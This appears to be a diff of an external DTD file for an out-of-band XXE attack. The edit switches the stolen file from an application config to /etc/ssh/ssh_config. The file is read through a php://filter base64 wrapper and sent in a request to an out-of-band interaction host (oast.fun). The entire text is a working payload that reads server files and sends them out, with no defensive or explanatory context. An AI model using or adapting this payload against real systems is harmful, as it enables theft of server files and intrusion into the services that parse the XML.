@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///home/admin/aquaponey.conf">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/ssh/ssh_config">
 <!ENTITY % inception "<!ENTITY exfil SYSTEM 'https://yxbzthesqwtqlzsjuqzxflkn4olz7mnkx.oast.fun/data?%data;'>">
